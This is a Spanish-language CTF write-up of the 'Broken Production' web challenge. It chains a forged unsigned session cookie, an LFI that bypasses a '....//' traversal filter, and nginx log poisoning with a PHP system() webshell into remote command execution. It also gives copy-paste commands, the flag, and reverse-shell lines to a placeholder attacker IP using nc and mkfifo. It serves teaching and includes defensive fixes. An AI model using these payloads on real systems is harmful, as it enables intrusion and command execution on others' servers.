---
tags: [ctf, web, pwn, atenea, php, lfi, log-poisoning, broken-auth]
reto: Broken Production
categoria: Web
evento: ATENEA-JORNADAS (CCN-CERT)
flag: "HTB{br0k3n_au7hs_p0i50n3d_l0gs}"
estado: resuelto
---

# Web: Broken Production

> Pentest de **caja blanca**: a diferencia de los retos de OSINT y Forensics, aquí tenías el código fuente completo de la aplicación. El método cambia: no se trata de adivinar, sino de **leer el código siguiendo el camino de una petición HTTP** hasta encontrar dónde el servidor confía en algo que no debería.

---

## 0. Cómo estudiar este documento

1. Lee la sección 3 (mentalidad de pentest de caja blanca): es la que se reutiliza en cualquier reto con código fuente.
2. Cada fase incluye: el código que se leyó, las preguntas que había que hacerse, la prueba realizada con su resultado real, y la lectura.
3. Haz la autoevaluación (sección 13) sin mirar las respuestas.
4. Repite el razonamiento completo tapando las respuestas, solo con el código fuente delante.

---

## 1. La historia en 30 segundos

Un portal de gestión de empleados en PHP tenía tres fallos encadenados:

1. La cookie de sesión era un JSON en base64 **sin firmar**: cualquiera podía fabricar una cookie con `{"username":"admin"}` y entrar como administrador **sin haberse registrado nunca**.
2. El panel de admin incluía ficheros PHP a partir de un parámetro de la URL (`?util=`), con un filtro anti-traversal que **no era recursivo** y se saltaba con `....//`.
3. El servidor web guardaba el `User-Agent` de cada petición en su log de acceso **sin sanitizar**. Al incluir ese log con el fallo anterior, cualquier código PHP metido en el `User-Agent` se ejecutaba: **ejecución remota de comandos** como el usuario `www`.

Flag: `HTB{br0k3n_au7hs_p0i50n3d_l0gs}` — el propio nombre resume el reto: *broken auths* (autenticación rota) + *poisoned logs* (logs envenenados).

---

## 2. Los datos de partida

> **Broken Production.** Nuestros desarrolladores de PHP están trabajando en este portal de gestión de empleados. Tenemos una build simulada de la web y hay que hacerle un pentest para encontrar debilidades. El objetivo es conseguir más privilegios y ejecución de comandos en el servidor.

- Objetivo: la instancia del reto expuesta por la plataforma (contenedor Docker), en adelante `<TARGET>` en los comandos.
- Material adicional: el **código fuente completo** de la aplicación (`web_broken_prod/`), con el Dockerfile y la configuración de nginx y PHP-FPM.
- Objetivos explícitos: (1) escalada de privilegios, (2) ejecución de comandos.

### Estructura relevante del código

```
challenge/
├── index.php              <- registra las rutas
├── Router.php              <- motor de rutas
├── SessionHandler.php       <- gestión de sesión (AQUÍ el primer fallo)
├── Database.php
├── utils/
│   ├── logs.php
│   ├── tickets.php
│   └── todo.php
└── views/
    ├── index.php            <- decide admin.php vs user.php
    ├── admin.php             <- panel de admin (AQUÍ el segundo fallo)
    ├── login.php
    ├── register.php
    └── user.php              <- panel de usuario normal (incluido desde index.php)
config/
├── nginx.conf                <- AQUÍ la pista del tercer fallo
├── fpm.conf
└── supervisord.conf
```

---

## 3. Mentalidad: pentest de caja blanca (con el código delante)

### 3.1 Sigue el camino de una petición, no leas ficheros al azar

Con el código fuente completo, la tentación es abrir ficheros sin orden. El método correcto es **trazar el camino real de una petición HTTP**, de fuera hacia dentro:

```
Petición HTTP → Router.php (¿qué ruta soy?)
             → SessionHandler.php (¿quién soy?)
             → index.php / views/*.php (¿qué me enseñan?)
             → utils/*.php, Database.php (¿qué hace el servidor con mis datos?)
```

En cada punto la pregunta es la misma: **¿qué confía el servidor que no debería, porque viene del cliente?**

### 3.2 Dos preguntas para cada variable: ¿de dónde viene y quién la verifica?

Cuando veas una variable que decide algo importante (`$admin`, `$utilFile`, `$fullPath`), haz siempre estas dos preguntas:

1. **¿De dónde sale el valor?** (`$_GET`, `$_POST`, una cookie, una variable fija del programador...)
2. **¿Hay algo entre el origen y el uso que verifique, firme o filtre ese valor de forma fiable?**

Si la respuesta a la 1 es "del cliente" y a la 2 es "no" o "un filtro débil", tienes una vulnerabilidad.

### 3.3 Descarta con evidencia, no con intuición

En este reto se planteó una hipótesis de LFI a través de `Router::view()`, que se descartó leyendo el código y comprobando que **ningún** sitio pasaba datos del usuario a esa función. No se descartó "porque no se veía nada raro a simple vista": se verificó mirando **todas** las llamadas.

### 3.4 Un filtro de seguridad hay que probarlo, no fiarse de su nombre

`str_replace("../", "", $utilFile)` **parece** una protección contra *path traversal*. Pero "parece" no es "es". Hubo que razonar cómo funciona exactamente `str_replace` (una sola pasada, no recursiva) para encontrar el hueco.

### 3.5 Una vulnerabilidad rara vez basta por sí sola

Ninguno de los tres fallos por separado te daba el objetivo final:

- La cookie sin firmar te da un **rol**, no acceso a datos del sistema.
- El LFI te da **lectura de ficheros**, no ejecución de código, hasta que lo combinas con algo que puedas escribir.
- El log poisoning necesita primero del LFI para poder incluir el log.

El pentest real es encontrar cómo **se encadenan**.

---

## 4. Fase 1: Reconocimiento — la pantalla de login

![Formulario de login con usuario y contraseña, enlace a "Create your Account"](assets/web-broken-production/01-login-page.png)

### Qué se probó

Credenciales por defecto y combinaciones comunes (`admin/admin`, `admin/password`, variantes del nombre del reto) en el formulario. Ninguna funcionó.

### Qué se observó

![URL tras un login fallido: /login?msg=Invalid username or password!](assets/web-broken-production/02-url-msg-param.png)

### Lectura

Un parámetro `msg` reflejado en la URL tras un fallo de login es un **candidato clásico a XSS reflejado**. Se investigó mirando el código fuente de la página de login: el texto "Invalid username or password!" **no aparece en el HTML** de `views/login.php` (solo hay un `<p>` fijo oculto con "Successful login!"). Hipótesis de trabajo: si ese `msg` se muestra en algún sitio, probablemente sea `main.js` quien lo lee de `location.search`, no el servidor quien lo imprime directamente; esto no se llegó a comprobar leyendo `main.js`. No se profundizó en esta vía porque apareció un camino más directo y de mayor impacto (ver fase 2); queda anotada como pendiente en la sección 12.

---

## 5. Fase 2: Leer el código siguiendo la petición

### 5.1 `Router.php`: el motor de rutas

```php
public function view($view, $data = [])
{
    extract($data);
    include __DIR__."/views/${view}.php";
    exit;
}
```

**La pregunta clave:** ¿de dónde sale `$view`? Si viniera de datos del usuario, sería un LFI inmediato.

(Nota de versión: la interpolación `${view}` dentro de la cadena está obsoleta desde PHP 8.2; en una versión más reciente de PHP este código daría un *warning* de obsolescencia, aunque seguiría funcionando igual en esta ejecución.)

### 5.2 `index.php`: dónde se llama a `view()`

```php
$router->view('index', ['admin' => $session->isAdmin(), 'username' => $session->getUsername()]);
$router->view('login');
$router->view('register');
```

**Lectura:** las tres llamadas usan **textos fijos** (`'index'`, `'login'`, `'register'`), nunca una variable que dependa de la petición. **Descartado con evidencia**: este `include` no es explotable, aunque la función en sí sea peligrosa en abstracto. Una función "peligrosa" no es automáticamente una vulnerabilidad: depende de cómo se la llame en **todo** el código, no en un sitio aislado.

### 5.3 `SessionHandler.php`: aquí está el primer fallo

```php
public function login($username)
{
    setcookie('PHPSESSID', base64_encode(json_encode([
        'username' => $username
    ])), time()+1333337, '/');
}

public function load()
{
    $this->data = json_decode(base64_decode($this->cookie));
}

public function isAdmin()
{
    return $this->data->username === 'admin';
}
```

**Las dos preguntas de la sección 3.2 aplicadas aquí:**

1. ¿De dónde sale `$this->data->username`? De `$_COOKIE['PHPSESSID']`, que manda **el navegador del cliente**.
2. ¿Hay algo que firme o verifique ese valor? Se repasó el fichero entero: no hay `hash_hmac`, no hay clave secreta, no hay comparación contra una sesión real del servidor ni contra la base de datos. **Base64 es una codificación reversible, no un cifrado.**

**Conclusión:** el control de acceso de toda la aplicación depende de un dato que el **cliente** fabrica. Es un **control de acceso roto** (Broken Access Control / Broken Authentication, OWASP A01 y A07).

---

## 6. Fase 3: Fabricar la cookie y demostrar la escalada

### El razonamiento antes de actuar

Como no hay firma, se puede construir el JSON a mano **sin haber iniciado sesión jamás**:

```bash
echo -n '{"username":"admin"}' | base64
```

```
eyJ1c2VybmFtZSI6ImFkbWluIn0=
```

### La prueba

![Extensión Cookie-Editor usada para inyectar la cookie manualmente, sin pasar por el formulario de login](assets/web-broken-production/03-cookie-editor-admin-panel.png)

![El valor de PHPSESSID coincide exactamente con el base64 calculado a mano](assets/web-broken-production/04-cookie-value-forged.png)

![ADMIN DASHBOARD (UNDER CONSTRUCTION), usuario admin, rol ADMINISTRATOR](assets/web-broken-production/05-admin-panel-access.png)

### Confirmación con el código

`views/index.php` cierra el círculo:

```php
<?php if ($admin){
        include_once "admin.php";
    } else{
        include_once "user.php";
    }
?>
```

El booleano `$admin` viene directo de `$session->isAdmin()`, que a su vez viene de tu cookie. Las capturas confirman que esto se cumple en la instancia real, y el código muestra exactamente por qué:

```
cookie fabricada sin login
  → SessionHandler::load() la decodifica
  → SessionHandler::isAdmin() compara username === 'admin'
  → views/index.php: if ($admin) incluye admin.php
```

**Primer objetivo del enunciado, cumplido: escalada de privilegios.**

---

## 7. Fase 4: El segundo fallo, dentro ya del panel de admin

### El código de `views/admin.php`

```php
$utilFile = "tickets.php";

if (isset($_GET['util']))
	$utilFile = $_GET['util'];
	$utilFile = str_replace("../","", $utilFile);

$fullPath = '/www/utils/'.$utilFile;
...
<?php include_once($fullPath); ?>
```

### Lectura de un detalle de estilo que hay que saber ver

El `if` no tiene llaves `{ }`. En PHP, sin llaves, el `if` solo controla la **línea siguiente**. Aquí:

```php
if (isset($_GET['util']))
	$utilFile = $_GET['util'];          // <- esta línea SÍ está dentro del if
	$utilFile = str_replace("../","", $utilFile);   // <- esta se ejecuta SIEMPRE
```

En este caso concreto no cambia el resultado (si no hay `util`, `$utilFile` sigue siendo `"tickets.php"` y el `str_replace` sobre ese texto no hace nada), pero es el tipo de fallo de indentación que, en otro contexto, sí cambiaría el comportamiento. Es un error de indentación/lógica, no solo una cuestión de estilo, y vale la pena entrenar el ojo para detectarlo.

### Las dos preguntas de siempre

1. ¿De dónde sale `$utilFile`? De `$_GET['util']`: **controlado por el atacante**.
2. ¿Qué lo filtra? `str_replace("../", "", $utilFile)`: busca el texto `../` y lo elimina, **una vez, en una sola pasada, no recursivamente**.

### El bypass, razonado paso a paso

La pregunta que hay que hacerse: *¿puedo construir un texto que contenga `../` "escondido", de forma que al quitar exactamente una aparición de `../`, lo que sobra se recombine en `../`?*

Toma la cadena `....//` (cuatro puntos, dos barras) y numera sus caracteres:

```
índice:  0 1 2 3 4 5
carácter: . . . . / /
```

Busca la subcadena `../` (punto, punto, barra) dentro de eso. Está en los índices 2-3-4: `.`, `.`, `/`. Si `str_replace` elimina exactamente esos tres caracteres, quedan los índices 0, 1 y 5: `.`, `.`, `/` → **`../`**. El filtro, al "limpiar" la cadena, **crea** la secuencia que quería evitar.

### La prueba

```
http://<TARGET>/?util=....//....//....//....//etc/passwd
```

![Contenido de /etc/passwd: root:x:0:0:root:/root:/bin/ash, www:x:1000:1000:1000:/home/www:/bin/sh, nginx:x:100:101:..., listado completo de usuarios del sistema](assets/web-broken-production/06-lfi-etc-passwd.png)

**Lectura de un dato importante de esa salida:** el shell de `root` es `/bin/ash` (BusyBox/Alpine), no `/bin/bash`. Esto importa para más adelante: muchos *one-liners* de Internet para reverse shells asumen `bash` y no funcionan tal cual aquí.

**Resultado:** lectura de ficheros arbitrarios en el sistema, fuera por completo de la carpeta `/www/utils/` a la que debería estar limitado (**CWE-22, Path Traversal**, que habilita un **LFI, CWE-98**). Esto se confirmó para rutas como `/etc/passwd` y, más adelante, el log de nginx; no se verificó si existe algún límite adicional (`open_basedir` u otro) para rutas fuera de esas.

---

## 8. Fase 5: De leer ficheros a ejecutar código

### El dato que faltaba: `config/nginx.conf`

```
user www;
...
log_format docker '$remote_addr $remote_user $status "$request" "$http_referer" "$http_user_agent" ';
access_log /var/log/nginx/access.log docker;
```

### `config/fpm.conf`

```ini
[www]
user = www
group = www
```

### Lectura

1. **Nginx guarda el `User-Agent` de cada petición** en texto plano, en `/var/log/nginx/access.log`, **sin sanitizarlo**.
2. **nginx y PHP-FPM corren con el mismo usuario, `www`**. Si se logra ejecutar comandos, será con este usuario.

### El razonamiento del log poisoning

Encadena tres hechos ya confirmados:

1. `include()` en PHP no es "mostrar un fichero": si encuentra `<?php ... ?>` dentro, lo **ejecuta**.
2. El log de acceso es un fichero de texto en disco cuyo contenido **tú controlas parcialmente** (el User-Agent es tuyo).
3. Ya se demostró que el LFI llega hasta rutas arbitrarias del sistema (sección 7), incluido ese log.

Conclusión: si metes `<?php ... ?>` en tu User-Agent, queda escrito en el log, y si luego incluyes ese log con el LFI, PHP ejecuta tu código.

### Prueba 1: demostrar el mecanismo con algo inofensivo

**Paso A — envenenar el log:**

```bash
curl -A "<?php echo 'TEST_LOG_POISON_OK'; ?>" "http://<TARGET>/" \
  -H "Cookie: PHPSESSID=eyJ1c2VybmFtZSI6ImFkbWluIn0="
```

**Paso B — incluir el log envenenado:**

```
http://<TARGET>/?util=....//....//....//....//var/log/nginx/access.log
```

![En vez de ver <?php echo 'TEST_LOG_POISON_OK'; ?> como texto, se ve directamente TEST_LOG_POISON_OK en el hueco donde debería estar el User-Agent: el código se ejecutó](assets/web-broken-production/07-log-poison-test-ok.png)

### Prueba 2: ejecución de comandos real

Se cambia `echo` por una función que ejecute comandos del sistema, parametrizada con `$_GET['cmd']` para no tener que reenvenenar el log cada vez que se quiera probar un comando distinto:

**Paso A:**

```bash
curl -A "<?php system(\$_GET['cmd']); ?>" "http://<TARGET>/" \
  -H "Cookie: PHPSESSID=eyJ1c2VybmFtZSI6ImFkbWluIn0="
```

(El `\$` es un escape de *shell*: evita que bash expanda `$_GET['cmd']` como si fuera una variable propia antes de mandarlo en la petición; lo que llega al servidor es el signo `$` literal, para que sea PHP quien lo interprete.)

**Paso B**, con `cmd` en la misma URL que hace el `include`:

```
http://<TARGET>/?util=....//....//....//....//var/log/nginx/access.log&cmd=id
```

![uid=1000(www) gid=1000(www) groups=1000(www) en el hueco del User-Agent](assets/web-broken-production/08-log-poison-rce-id.png)

**Segundo objetivo del enunciado, cumplido: ejecución de comandos en el servidor**, con el usuario `www` (coincide con lo que ya se sabía por `nginx.conf` y `fpm.conf`).

---

## 9. Fase 6: ¿Reverse shell?

### El intento

Se planteó montar una reverse shell con `nc`:

```bash
# listener en la máquina propia
nc -lvnp 4444

# comando a ejecutar en el servidor (necesita URL-encoding de los espacios)
cmd=nc%20TU_IP%204444%20-e%20/bin/sh
```

### Por qué no se hizo

**Pregunta de verificación, antes de perder tiempo:** una reverse shell exige que el servidor pueda **iniciar una conexión saliente** hacia la IP del atacante. Eso solo funciona si hay una ruta de red entre ambos (por ejemplo, estando conectado a la VPN del CTF). En este caso, **no había conexión VPN activa**, así que no existía ninguna IP del jugador alcanzable desde el contenedor. El riesgo de intentarlo sin esa ruta era que el comando se ejecutara igualmente en el servidor, abriera una conexión que no llega a nadie y se quedara esperando sin devolver ningún error que avisara de que el problema era de red y no de sintaxis.

### La lección

Antes de construir una técnica, comprueba su **precondición de red**, no solo su sintaxis. Y recuerda: **la ejecución de comandos uno a uno (como ya se tenía con `cmd=`) es funcionalmente equivalente a una shell interactiva, solo que más lenta.** No hacía falta la shell para cumplir el objetivo del enunciado ni para encontrar la flag.

### Notas para una próxima vez, si hay conectividad

- El sistema es Alpine/BusyBox (`/bin/ash`), no asumas `bash` ni `/dev/tcp/...`.
- Si `nc` no soporta `-e` (depende de cómo esté compilado), la alternativa clásica es la tubería con nombre:
  ```
  mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc TU_IP 4444 > /tmp/f
  ```
- Comprueba antes qué hay disponible: `cmd=which nc`, `cmd=which python3`, `cmd=busybox` (lista los applets compilados).

---

## 10. Fase 7: Encontrar la flag

### El camino equivocado (pero instructivo)

Primero se intentó una búsqueda genérica:

```
cmd=find%20/%20-iname%20%22*flag*%22%20-not%20-path%20%22/proc/*%22%202%3E/dev/null
```

Esto devolvió, entre otros, un fichero cuyo nombre contenía "flag", mezclado con **falsos positivos** del propio kernel Linux (rutas de `/sys/devices/.../flags`, que no tienen nada que ver con el reto: "flags" ahí es un término genérico de atributos de hardware, no una flag de CTF). **Lección:** una búsqueda amplia por nombre trae ruido; hay que filtrar los resultados con sentido, no tomar el primero que aparece.

### El camino real: el bot de verificación

Tras demostrar la ejecución de comandos (la prueba de `id`), apareció **sin que nadie la escribiera** esta línea en el log:

```
"GET / HTTP/1.1" "-" "HTB{br0k3n_au7hs_p0i50n3d_l0gs} "
```

**Interpretación:** todo apunta a que el reto tiene un proceso automático que visita la web periódicamente y, al detectar que la explotación tuvo éxito, entrega la flag dejándola como `User-Agent` en una petición propia; no se llegó a confirmar el mecanismo exacto más allá de observar esta línea. Es una entrega distinta a la de otros retos de esta misma serie, donde la flag estaba en un fichero fijo: aquí la flag **aparece como consecuencia de haber demostrado el impacto**, no como un fichero que hay que buscar.

### Una lección de método, no solo de contenido

Al buscar la flag dentro del log incluido en el navegador, se esperaba encontrarla al final, por costumbre de cómo se entregaba en otros retos. Pero el log es cronológico y el bot pudo escribir su línea en cualquier momento, **en mitad** del fichero: de hecho apareció antes del final, no en la última línea. La forma correcta de buscar fue `Ctrl+F` → `HTB{`, es decir, **buscar por contenido, no por posición esperada**.

---

## 11. La cadena completa de vulnerabilidades

| # | Vulnerabilidad | Fichero | Causa | Impacto |
|---|---|---|---|---|
| 1 | Control de acceso roto / cookie de sesión sin firmar | `SessionHandler.php` | `base64(json)` sin HMAC ni validación en servidor | Suplantar a cualquier usuario, incluido `admin`, sin autenticarse nunca |
| 2 | Local File Inclusion (Path Traversal con bypass de filtro) | `views/admin.php` | `str_replace("../","",...)` no recursivo | Lectura de ficheros arbitrarios del sistema |
| 3 | Log Poisoning → RCE | `config/nginx.conf` + el LFI anterior | El `User-Agent` se escribe sin sanitizar en un log que luego se puede incluir | Ejecución de comandos arbitrarios como el usuario `www` |

**Clasificación aproximada (OWASP Top 10 / CWE):**

- Vulnerabilidad 1: A07:2021 - Identification and Authentication Failures / A01:2021 - Broken Access Control.
- Vulnerabilidad 2: CWE-22 (Path Traversal) + CWE-98 (PHP Remote/Local File Inclusion).
- Vulnerabilidad 3: CWE-117 (Improper Output Neutralization for Logs) combinado con el LFI anterior para lograr RCE.

---

## 12. Recomendaciones (la parte "defensiva" de un pentest)

| Problema | Recomendación |
|---|---|
| Cookie sin firmar | Usar las sesiones nativas de PHP (`session_start()`) o, si se necesita un token propio, firmarlo con `hash_hmac` y una clave secreta del servidor, verificando la firma en cada petición |
| `isAdmin()` por comparación de texto | El rol debería consultarse en el servidor (base de datos), nunca derivarse de un dato que manda el cliente |
| `include_once($fullPath)` con entrada de usuario | No incluir ficheros a partir de parámetros de usuario. Si es imprescindible, usar una **lista blanca** de valores permitidos (`in_array($utilFile, ['logs.php','tickets.php','todo.php'])`), no un filtro de "quitar patrones" |
| Filtro `str_replace` no recursivo | Es frágil incluso aplicado en bucle; mejor usar `basename()` y comparar contra una lista blanca directamente |
| Logs con datos de usuario sin sanitizar | Aceptable para lectura humana, pero **nunca deberían ser incluibles por la aplicación**; separar el directorio de logs del alcance de cualquier función de inclusión, usar `open_basedir` para limitar qué puede leer PHP, y evitar que PHP pueda ejecutarse fuera del document root |
| `clear_env = On` en PHP-FPM (detalle positivo) | Esto ya limita el acceso a variables de entorno del proceso; buena práctica a mantener |

Pendiente de investigar (quedó fuera del alcance de este write-up): si el `msg=` de la fase 1 es explotable como XSS basado en DOM vía `main.js`. Ejercicio propuesto en la sección 13.

---

## 13. Autoevaluación y ejercicios (responde sin mirar)

<details>
<summary>1. ¿Por qué <code>base64_encode</code> no protege la cookie de sesión?</summary>

Porque base64 es una codificación reversible por cualquiera, no un cifrado ni una firma. Cualquiera puede decodificarla, leerla, modificarla y volver a codificarla.
</details>

<details>
<summary>2. ¿Qué habría hecho falta en <code>SessionHandler.php</code> para que la cookie no se pudiera fabricar?</summary>

Una firma criptográfica (por ejemplo `hash_hmac` con una clave secreta del servidor) verificada en cada `load()`, o usar las sesiones nativas de PHP, donde el identificador de sesión no contiene datos legibles ni modificables por el cliente, solo un puntero a datos guardados en el servidor.
</details>

<details>
<summary>3. ¿Por qué se descartó el <code>include</code> del <code>Router.php</code> como vulnerable, y el de <code>views/admin.php</code> no?</summary>

Porque en `Router.php`, todas las llamadas a `view()` en `index.php` usan textos fijos, nunca datos del usuario. En `views/admin.php`, `$utilFile` sale directamente de `$_GET['util']`.
</details>

<details>
<summary>4. Explica con tus propias palabras por qué <code>....//</code> burla <code>str_replace("../","","....//")</code>.</summary>

Porque `str_replace` quita una sola aparición de `../` en una sola pasada. Dentro de `....//` hay una subcadena `../` (en el medio); al quitarla, los caracteres que quedan a los lados se recomponen formando de nuevo `../`.
</details>

<details>
<summary>5. ¿Por qué nginx y PHP-FPM corriendo como el mismo usuario (<code>www</code>) es relevante para el pentest?</summary>

Porque indica con qué privilegios se ejecutará cualquier comando que consigas correr mediante RCE: no sería `root`, sería `www`. El `/etc/passwd` leído con el LFI confirma que `www` es una cuenta de servicio normal, sin privilegios especiales visibles en ese fichero (aunque `/etc/passwd` por sí solo no certifica qué puede o no hacer ese usuario en el sistema).
</details>

<details>
<summary>6. ¿Qué dos cosas hacen falta para que el log poisoning funcione, y cuál se consiguió primero?</summary>

Hace falta (a) poder escribir contenido propio en un fichero del servidor (el User-Agent en el log) y (b) poder incluir ese fichero para que PHP lo ejecute (el LFI). El LFI se consiguió primero; sin él, poder "escribir" en el log no serviría de nada.
</details>

<details>
<summary>7. ¿Por qué no se montó una reverse shell?</summary>

Porque no había conectividad de red (VPN) entre la máquina del atacante y el contenedor del reto; sin una IP alcanzable, el servidor no podría completar la conexión saliente.
</details>

<details>
<summary>8. ¿Por qué buscar la flag con Ctrl+F fue mejor que leer el log de arriba a abajo?</summary>

Porque el log es muy largo y la flag no apareció donde se esperaba por costumbre de otros retos (al final); buscar por contenido exacto es más fiable que asumir dónde "debería" estar.
</details>

**Ejercicio pendiente (sin resolver en este documento):** investiga `main.js` para ver si el parámetro `msg` de la URL se inserta en el DOM sin sanitizar, lo que daría un XSS basado en DOM. Pista: busca si el script usa `location.search`, `URLSearchParams` o `innerHTML`.

---

## 14. Playbook reutilizable (pentest de caja blanca en PHP)

1. **Traza el camino de una petición**: router → autenticación/sesión → vista → lógica de negocio.
2. **Para cada variable que decide algo importante, pregunta: ¿de dónde viene? ¿quién la verifica?**
3. **No descartes una función peligrosa sin comprobar TODAS sus llamadas** en el código.
4. **No confíes en el nombre de un filtro de seguridad**: léelo y razona su comportamiento exacto (¿es recursivo? ¿cubre mayúsculas? ¿qué pasa en los bordes?).
5. **Una vulnerabilidad aislada rara vez es el objetivo final**: busca cómo se encadena con otra (lectura de ficheros + algo que puedas escribir = ejecución de código).
6. **Revisa los ficheros de configuración** (nginx, PHP-FPM, Docker): dicen con qué usuario corre todo y dónde están los logs, que suelen ser la pieza que falta para una ejecución de código.
7. **Comprueba las precondiciones de red antes de construir una técnica** (por ejemplo, una reverse shell necesita conectividad en ambos sentidos).
8. **Busca por contenido, no por posición esperada**, al rastrear un resultado en una salida larga.

---

## 15. Glosario

| Término | Significado |
|---|---|
| **LFI (Local File Inclusion)** | Vulnerabilidad donde la aplicación incluye y ejecuta un fichero local a partir de una entrada que el atacante controla |
| **Path Traversal** | Técnica para salir del directorio previsto usando secuencias como `../` |
| **Log Poisoning** | Escribir contenido malicioso en un log de la aplicación para luego conseguir que se ejecute, normalmente combinado con un LFI |
| **Broken Access Control** | Categoría de vulnerabilidad donde el control de quién puede hacer qué está mal implementado o se puede evadir |
| **RCE (Remote Code Execution)** | Capacidad de ejecutar comandos arbitrarios en el servidor objetivo |
| **Reverse shell** | Conexión de shell donde el servidor comprometido inicia la conexión hacia la máquina del atacante, en vez de al revés |
| **BusyBox / Alpine** | Distribución Linux minimalista, habitual en contenedores Docker, que usa `/bin/ash` en vez de `/bin/bash` y utilidades reducidas |

---

## 16. Todos los comandos, juntos (copiar y pegar)

```bash
# 1) Fabricar la cookie de admin (sin haberse registrado nunca)
echo -n '{"username":"admin"}' | base64
# -> eyJ1c2VybmFtZSI6ImFkbWluIn0=
# Pegar ese valor como PHPSESSID con Cookie-Editor, path "/", y recargar la web.

# 2) Confirmar el LFI con bypass de filtro, leyendo /etc/passwd
# (en el navegador, con la cookie de admin puesta)
http://<TARGET>/?util=....//....//....//....//etc/passwd

# 3) Prueba de log poisoning inofensiva
curl -A "<?php echo 'TEST_LOG_POISON_OK'; ?>" "http://<TARGET>/" \
  -H "Cookie: PHPSESSID=eyJ1c2VybmFtZSI6ImFkbWluIn0="

http://<TARGET>/?util=....//....//....//....//var/log/nginx/access.log

# 4) Log poisoning con ejecución de comandos real
curl -A "<?php system(\$_GET['cmd']); ?>" "http://<TARGET>/" \
  -H "Cookie: PHPSESSID=eyJ1c2VybmFtZSI6ImFkbWluIn0="

http://<TARGET>/?util=....//....//....//....//var/log/nginx/access.log&cmd=id

# 5) Buscar la flag (ruta inicial, con falsos positivos)
http://<TARGET>/?util=....//....//....//....//var/log/nginx/access.log&cmd=find%20/%20-iname%20%22*flag*%22%20-not%20-path%20%22/proc/*%22%202%3E/dev/null
```

La flag real apareció sola en el log, entregada por lo que parece ser un bot de verificación de la plataforma:

```
HTB{br0k3n_au7hs_p0i50n3d_l0gs}
```
